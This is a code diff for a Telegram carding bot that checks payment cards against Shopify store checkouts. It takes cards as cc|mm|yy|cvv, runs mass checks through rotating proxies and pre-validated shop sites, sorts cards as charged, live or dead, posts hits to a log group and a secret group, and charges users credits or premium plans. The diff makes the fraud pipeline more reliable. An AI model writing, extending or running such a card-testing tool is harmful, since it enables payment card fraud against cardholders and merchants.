+def _maintenance_msg():  return _guard(f'Maintenance {_te(PROG_ERRORS_EMOJI_ID,"⚠️")}',  '<b>Bot is under maintenance.</b>')
+def _gate_off_msg():     return _guard(f'Gate Off {_te(PROG_DEAD_EMOJI_ID,"❌")}',         '<b>Shopify gate is currently OFF.</b>')
+def _no_credits_msg():   return _guard(f'No Credits {_te(PROG_DEAD_EMOJI_ID,"❌")}',      '<b>0 credits — use /sub or /key.</b>')
+def _cooldown_msg(r):    return _guard(f'Cooldown {_te(PROG_ERRORS_EMOJI_ID,"⚠️")}',     f'<b>Wait <code>{r:.1f}s</code>. Premium = zero cooldown.</b>')
+def _join_msg():         return _guard(f'Join Required {_te(PROG_GATE_EMOJI_ID,"🔒")}',   '<b>Join channels below to use the bot:</b>')
+def _usage_sh_msg():     return _guard(f'Usage {_te(PROG_ERRORS_EMOJI_ID,"⚠️")}',        '<b>Command:</b> <code>/sh cc|mm|yy|cvv</code>\n<b>Example:</b>\n<code>/sh 4111111111111111|12|26|123</code>')
+def _usage_msh_msg():    return _guard(f'Usage {_te(PROG_ERRORS_EMOJI_ID,"⚠️")}',        '<b>Command:</b> <code>/msh</code> (attach .txt or paste cards)\n<b>Format:</b> <code>cc|mm|yy|cvv</code>')
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -753,10 +957,6 @@ def _kb_verdict(verdict: str) -> RawMarkup:
     return RawMarkup([[_btn("ERROR", url=BOT_CHANNEL, style="secondary", icon=PROG_ERRORS_EMOJI_ID), _bot_btn()]])
 
 def _msh_buttons(sid: str, running: bool = True) -> RawMarkup:
-    """
-    FIX 11: shows Error (N) button when there are site-error cards.
-    Stop button is ALWAYS present while running — it never locks.
-    """
     s   = MSH_SESSIONS.get(sid, {})
     chg = s.get("charged", 0)
     lv  = s.get("live", 0)
@@ -773,7 +973,6 @@ def _msh_buttons(sid: str, running: bool = True) -> RawMarkup:
             _btn(f"All ({chk})",     cb=f"{_CB_RESULT}_{sid}_all",     style="primary", icon=BTN_ALL_EMOJI_ID),
         ],
     ]
-    # FIX 11: error download button only when there are error cards
     if err > 0:
         rows.append([
             _btn(f"⚠️ Errors ({err})", cb=f"{_CB_RESULT}_{sid}_error",
@@ -878,10 +1077,8 @@ async def _send_hit_log(bot, resp: str, price: str, currency: str,
         log_text = _share_group_text(resp, price, currency, user, plan, verdict)
         try:
             await bot.send_message(
-                chat_id=HIT_LOG_GROUP_ID,
-                text=log_text,
-                parse_mode="HTML",
-                disable_web_page_preview=True,
+                chat_id=HIT_LOG_GROUP_ID, text=log_text,
+                parse_mode="HTML", disable_web_page_preview=True,
                 reply_markup=_share_group_kb(),
             )
         except Exception as e:
@@ -890,10 +1087,8 @@ async def _send_hit_log(bot, resp: str, price: str, currency: str,
         secret_text = _hit_text(card, resp, bin_data, price, currency, 0, user, plan, verdict)
         try:
             await bot.send_message(
-                chat_id=SECRET_GROUP_ID,
-                text=secret_text,
-                parse_mode="HTML",
-                disable_web_page_preview=True,
+                chat_id=SECRET_GROUP_ID, text=secret_text,
+                parse_mode="HTML", disable_web_page_preview=True,
             )
         except Exception as e:
             logging.error(f"[SH] secret-group → {SECRET_GROUP_ID}: {e}")
@@ -918,7 +1113,7 @@ async def _send_user_dm(bot, user, card, resp, bin_data, price, currency,
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# /sh  SINGLE CARD  — persistent session, parallel BIN
+# /sh SINGLE CARD
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
@@ -973,11 +1168,11 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
         cs[user.id]   = time.time()
         ud["credits"] = max(0, ud.get("credits", 1) - 1)
 
-    sites   = _load_sites()
-    proxies = _load_proxies()
-    plan    = ud.get("plan", "TRIAL")
-    t0      = time.time()
-    bin6    = card.split("|")[0][:6]
+    all_sites = _load_sites()
+    proxies   = _load_proxies()
+    plan      = ud.get("plan", "TRIAL")
+    t0        = time.time()
+    bin6      = card.split("|")[0][:6]
 
     spinner_kb = RawMarkup([[_btn("Checking…", url=BOT_CHANNEL, style="secondary",
                                   icon=PROG_PROGRESS_EMOJI_ID)]])
@@ -990,9 +1185,15 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception:
         msg = await update.message.reply_text("🛒 Checking…")
 
+    # FIX 12: use pre-flight validated sites (cached if recently validated)
+    # For /sh we use the cache; if empty we run a quick light pre-flight
+    sites = _PREFLIGHT_CACHE["sites"] if (
+        time.time() - _PREFLIGHT_CACHE["ts"] < PREFLIGHT_CACHE_TTL
+        and _PREFLIGHT_CACHE["sites"]
+    ) else all_sites
+
     try:
         sess = await _get_sh_session()
-        # FIX 10: pass sid="" for /sh — no stop needed for single card
         (verdict, resp_text, api_price, api_currency), bin_data = await asyncio.gather(
             _check_card_with_retry(sess, card, sites, proxies,
                                    max_sites=SH_SITE_RETRIES,
@@ -1008,6 +1209,17 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
         verdict, resp_text, api_price, api_currency = "DEAD", str(e)[:80], "0.00", "USD"
         bin_data = {}
 
+    # If /sh still gets all-ERROR (sites broken), try with full sites list once
+    if verdict == "ERROR" and sites is not all_sites:
+        try:
+            sess2 = await _get_sh_session()
+            verdict, resp_text, api_price, api_currency = await _check_card_with_retry(
+                sess2, card, all_sites, proxies,
+                max_sites=SH_SITE_RETRIES, site_timeout=SH_SITE_TIMEOUT, sid="",
+            )
+        except Exception:
+            pass
+
     if not isinstance(bin_data, dict):
         bin_data = {}
 
@@ -1020,7 +1232,6 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
         ud["declined_checks"] = ud.get("declined_checks", 0) + 1
     ud["total_checks"] = ud.get("total_checks", 0) + 1
 
-    # FIX 11: for /sh, ERROR means all sites broke — show as error, not dead
     text = _build_result(card, resp_text, verdict, bt, api_price, api_currency, elapsed, user, plan)
     kb   = _kb_verdict(verdict)
     try:
@@ -1044,14 +1255,13 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# PROGRESS TEXT + UPDATE  (mass checker)
+# PROGRESS TEXT + UPDATE
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 def _progress_text(sess: dict) -> str:
     elapsed = time.time() - sess["start_time"]
     ulink   = _user_link(sess["user_obj"]) if sess.get("user_obj") else "User"
     peid    = _plan_eid(sess.get("plan", "TRIAL"))
     err     = sess.get("errors", 0)
-    # FIX 11: show errors only when > 0 to keep UI clean
     err_line = (
         f'<b>Errors   ➳ {err}    {_te(PROG_ERRORS_EMOJI_ID,"⚠️")}</b>\n'
         if err > 0 else ""
@@ -1117,7 +1327,6 @@ def _generate_result_file(sess: dict, rtype: str, user_obj, plan: str):
     elif rtype == "dead":
         cards, label = sess.get("dead_cards", []), "Dead"
     elif rtype == "error":
-        # FIX 11: error cards download
         cards, label = sess.get("error_cards", []), "Error (Site Issues)"
     else:
         cards = (sess.get("charged_cards", []) + sess.get("live_cards", []) +
@@ -1175,7 +1384,6 @@ async def _mass_worker(
             return
 
         try:
-            # FIX 10: pass sid so _check_card_with_retry can abort mid-loop
             verdict, resp, price, currency = await _check_card_with_retry(
                 shared, card, sites, proxies,
                 max_sites=SITE_RETRIES, site_timeout=SITE_TIMEOUT,
@@ -1223,7 +1431,7 @@ async def _mass_worker(
                 return_exceptions=True,
             ))
         elif verdict == "ERROR":
-            # FIX 11: site error — card not classified, no credit deduction
+            # FIX 11: site error — no credit deduction
             sess["errors"] = sess.get("errors", 0) + 1
             sess.setdefault("error_cards", []).append(card_data)
         else:  # DEAD
@@ -1251,12 +1459,11 @@ async def _run_mass_batch(
     sem     = asyncio.Semaphore(MAX_CONCURRENT)
     bc      = BinCache()
 
-    # FIX 8: create connector separately so cb_msh_stop can close it instantly
+    # FIX 8: separate connector so cb_msh_stop can close it instantly
     connector = aiohttp.TCPConnector(
         limit=TCP_LIMIT, limit_per_host=TCP_PER_HOST,
         keepalive_timeout=30, enable_cleanup_closed=True,
     )
-    # Store reference in session — cb_msh_stop closes it for instant abort
     sess["_connector"] = connector
 
     async with aiohttp.ClientSession(
@@ -1264,7 +1471,7 @@ async def _run_mass_batch(
         timeout=aiohttp.ClientTimeout(total=SITE_TIMEOUT + 5),
         headers={"User-Agent": "Mozilla/5.0", "Accept": "application/json"},
     ) as shared:
-        sess["_shared"] = shared   # FIX 8: also store session reference
+        sess["_shared"] = shared
         tasks = []
         for card, cc_num in cards:
             if _is_stopped(sid): break
@@ -1278,14 +1485,12 @@ async def _run_mass_batch(
                 sess.setdefault("tasks", []).append(t)
         await asyncio.gather(*tasks, return_exceptions=True)
 
-    # Clean connector reference after session closes
     if sess:
         sess.pop("_connector", None)
         sess.pop("_shared", None)
 
     sess = MSH_SESSIONS.get(sid)
     if sess:
-        # Only deduct credits for genuinely DEAD cards (not ERROR/site-issue cards)
         dead = sess.get("_batch_dead", 0)
         if dead > 0:
             try:
@@ -1314,7 +1519,7 @@ async def _run_mass_batch(
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# /msh  MASS SHOPIFY COMMAND
+# /msh MASS SHOPIFY COMMAND
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 async def cmd_msh(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
@@ -1389,29 +1594,121 @@ async def cmd_msh(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not valid:
         await update.message.reply_text("❌ No valid cards after Luhn/expiry check."); return
 
-    sites   = _load_sites()
-    proxies = _load_proxies()
-    plan    = ud.get("plan", "TRIAL")
-    total   = len(valid)
-    sid     = "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
-    peid    = _plan_eid(plan)
-    ulink   = _user_link(user)
+    all_sites = _load_sites()
+    proxies   = _load_proxies()
+    plan      = ud.get("plan", "TRIAL")
+    total     = len(valid)
+    peid      = _plan_eid(plan)
+    ulink     = _user_link(user)
 
+    # ── FIX 12: Pre-flight site validation ───────────────────────────────
+    # Show a live "validating" message while we test sites.
+    # This prevents 100% ERROR batches caused by broken/wrong-gateway sites.
+    pf_total   = min(len(all_sites), PREFLIGHT_MAX_TEST)
+    pf_msg_txt = (
+        f'<b>{_te(PROG_GATE_EMOJI_ID,"🛒")} Gate ➳ Shopify</b>\n'
+        f'<b>{_te(PROG_PROGRESS_EMOJI_ID,"🔄")} Validating sites… 0/{pf_total} working</b>\n'
+        f'<b>Cards ready ➳ {total}</b>\n'
+        f'<b>{_te(USER_EMOJI_ID,"👤")} ➳ {ulink} {_te(peid,"⭐")}</b>\n'
+        f'<b>{_te(DEV_EMOJI_ID,"⚡")} ➳ {DEV_LINK_HTML} {_te(PRO_EMOJI_ID,"⭐")}</b>'
+    )
+    try:
+        pf_msg = await update.message.reply_text(
+            pf_msg_txt, parse_mode="HTML", disable_web_page_preview=True,
+        )
+    except Exception:
+        pf_msg = None
+
+    # Rate-limit preflight progress edits (max 1 edit / 2 s)
+    _pf_last_edit = [0.0]
+
+    async def _pf_progress(working: int, tested: int, total_sites: int):
+        now = time.time()
+        if pf_msg and now - _pf_last_edit[0] >= 2.0:
+            _pf_last_edit[0] = now
+            try:
+                await pf_msg.edit_text(
+                    f'<b>{_te(PROG_GATE_EMOJI_ID,"🛒")} Gate ➳ Shopify</b>\n'
+                    f'<b>{_te(PROG_PROGRESS_EMOJI_ID,"🔄")} Validating sites… '
+                    f'{tested}/{total_sites} tested — {working} working</b>\n'
+                    f'<b>Cards ready ➳ {total}</b>\n'
+                    f'<b>{_te(USER_EMOJI_ID,"👤")} ➳ {ulink} {_te(peid,"⭐")}</b>\n'
+                    f'<b>{_te(DEV_EMOJI_ID,"⚡")} ➳ {DEV_LINK_HTML} {_te(PRO_EMOJI_ID,"⭐")}</b>',
+                    parse_mode="HTML", disable_web_page_preview=True,
+                )
+            except Exception:
+                pass
+
+    working_sites = await _get_working_sites(all_sites, proxies, progress_cb=_pf_progress)
+
+    # FIX 13: If pre-flight finds < PREFLIGHT_MIN_SITES, DON'T abort.
+    # Instead fall back to ALL sites with a warning.
+    # Reason: pre-flight needs proxies & a working API to validate sites;
+    # if proxies aren't available or the API is slow, pre-flight fails even
+    # when sites are actually usable. Aborting wastes the user's cards.
+    using_fallback = False
+    if len(working_sites) < PREFLIGHT_MIN_SITES:
+        using_fallback = True
+        working_sites  = all_sites   # fall back to full list
+        warn_txt = (
+            f'<b>{_te(PROG_GATE_EMOJI_ID,"🛒")} Gate ➳ Shopify</b>\n\n'
+            f'<b>{_te(PROG_ERRORS_EMOJI_ID,"⚠️")} Pre-flight found 0 validated sites.</b>\n'
+            f'<b>Running with all {len(all_sites)} sites (fallback mode).</b>\n'
+            f'<b>Tip ➳ Run <code>/sitechk</code> to update sites.txt for better results.</b>\n'
+            f'<b>──────────</b>\n'
+            f'<b>{_te(DEV_EMOJI_ID,"⚡")} ➳ {DEV_LINK_HTML} {_te(PRO_EMOJI_ID,"⭐")}</b>'
+        )
+        if pf_msg:
+            try:
+                await pf_msg.edit_text(warn_txt, parse_mode="HTML",
+                                       disable_web_page_preview=True)
+                await asyncio.sleep(2)   # let user see the warning for 2 s
+            except Exception:
+                pass
+
+    # ── Sites validated — start mass check ───────────────────────────────
+    sid = "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
+
+    # FIX 13: show "validated" vs "fallback" in the starting message
+    sites_label = (
+        f'{len(working_sites)} (fallback ⚠️)' if using_fallback
+        else f'{len(working_sites)} validated ✅'
+    )
     init_text = (
         f'<b>{_te(PROG_GATE_EMOJI_ID,"🛒")} Gate ➳ Shopify</b>\n'
         f'<b>{_te(PROG_PROGRESS_EMOJI_ID,"🔄")} Progress ➳ 0/{total}</b>\n'
         f'<b>Charged ➳ 0 {_te(PROG_CHARGED_EMOJI_ID,"💎")}</b>\n'
         f'<b>Live    ➳ 0 {_te(PROG_LIVE_EMOJI_ID,"✅")}</b>\n'
         f'<b>Dead    ➳ 0 {_te(PROG_DEAD_EMOJI_ID,"❌")}</b>\n'
+        f'<b>Sites   ➳ {sites_label}</b>\n'
         f'<b>Time    ➳ 0s</b>\n'
         f'<b>{_te(USER_EMOJI_ID,"👤")} ➳ {ulink} {_te(peid,"⭐")}</b>\n'
         f'<b>{_te(DEV_EMOJI_ID,"⚡")} ➳ {DEV_LINK_HTML} {_te(PRO_EMOJI_ID,"⭐")}</b>'
     )
-    prog_msg = await update.message.reply_text(
-        init_text, parse_mode="HTML",
-        reply_markup=_msh_buttons(sid, True),
-        disable_web_page_preview=True,
-    )
+
+    # Replace the pre-flight message with the progress message
+    prog_msg = None
+    if pf_msg:
+        try:
+            await pf_msg.edit_text(
+                init_text, parse_mode="HTML",
+                reply_markup=_msh_buttons(sid, True),
+                disable_web_page_preview=True,
+            )
+            prog_msg = pf_msg
+        except Exception:
+            pass
+
+    if not prog_msg:
+        try:
+            prog_msg = await update.message.reply_text(
+                init_text, parse_mode="HTML",
+                reply_markup=_msh_buttons(sid, True),
+                disable_web_page_preview=True,
+            )
+        except Exception as e:
+            logging.error(f"[MSH] progress msg: {e}")
+            return
 
     MSH_SESSIONS[sid] = {
         "status":        "CHECKING",
@@ -1424,41 +1721,40 @@ async def cmd_msh(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "charged":       0,
         "live":          0,
         "dead":          0,
-        "errors":        0,        # FIX 11: site-error counter
+        "errors":        0,
         "_batch_dead":   0,
         "start_time":    time.time(),
         "tasks":         [],
-        "_connector":    None,     # FIX 8: filled by _run_mass_batch
-        "_shared":       None,     # FIX 8: filled by _run_mass_batch
+        "_connector":    None,
+        "_shared":       None,
         "last_text":     "",
         "last_update":   0,
         "charged_cards": [],
         "live_cards":    [],
         "dead_cards":    [],
-        "error_cards":   [],       # FIX 11
+        "error_cards":   [],
         "user_obj":      user,
         "plan":          plan,
     }
-    logging.info(f"🚀 [MSH] {sid} — {total} cards — conc {MAX_CONCURRENT} — user {user.id}")
-    asyncio.create_task(_run_mass_batch(context.bot, sid, valid, user, plan, sites, proxies))
+    logging.info(
+        f"🚀 [MSH] {sid} — {total} cards — "
+        f"sites: {len(working_sites)}/{len(all_sites)} valid — "
+        f"conc {MAX_CONCURRENT} — user {user.id}"
+    )
+    asyncio.create_task(
+        _run_mass_batch(context.bot, sid, valid, user, plan, working_sites, proxies)
+    )
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# CALLBACK HANDLERS  — Stop + Result download
+# CALLBACK HANDLERS — Stop + Result download
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 async def cb_msh_result(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """
     FIX 1: NO pre-emptive query.answer() at the top.
-
-    Telegram allows exactly ONE answer() per callback query.
-    The old code answered immediately then tried to answer again for every
-    error alert — all second calls threw BadRequest and the user saw nothing.
-    Each branch below calls answer() exactly once.
-
-    FIX 11: handles rtype == "error" for site-error card downloads.
+    Each branch calls answer() exactly once.
     """
     query = update.callback_query
-    # mshr_{sid}_{type}
     parts = query.data.split("_", 2)
     if len(parts) < 3:
         await query.answer("⚠️ Invalid button", show_alert=True)
@@ -1523,8 +1819,8 @@ async def cb_msh_result(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def cb_msh_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """
     FIX 2: Stop NEVER checks _is_locked — user must always be able to stop.
-    FIX 8: Closes the shared aiohttp connector immediately — aborts ALL
-           in-flight HTTP requests in < 100 ms for truly instant stopping.
+    FIX 8: Closes shared aiohttp connector immediately — aborts ALL in-flight
+           HTTP requests in < 100 ms for truly instant stopping.
     """
     query = update.callback_query
     parts = query.data.split("_", 1)
@@ -1537,20 +1833,19 @@ async def cb_msh_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if sess["status"] != "CHECKING":
         await query.answer("ℹ️ Already stopped", show_alert=True); return
 
-    # Step 1: mark STOPPED so all workers exit their checks immediately
+    # Step 1: mark STOPPED so all workers exit immediately
     sess["status"] = "STOPPED"
 
-    # Step 2 (FIX 8): close the aiohttp connector — kills all in-flight HTTP
-    # requests instantly instead of waiting for the per-request timeout
+    # Step 2 (FIX 8): close connector — kills all in-flight HTTP requests < 100 ms
     connector = sess.pop("_connector", None)
-    shared    = sess.pop("_shared",    None)
+    sess.pop("_shared", None)
     if connector and not connector.closed:
         try:
             asyncio.create_task(connector.close())
         except Exception:
             pass
 
-    # Step 3: cancel all pending asyncio tasks
+    # Step 3: cancel all asyncio tasks
     cancelled = 0
     for t in sess.get("tasks", []):
         if not t.done():
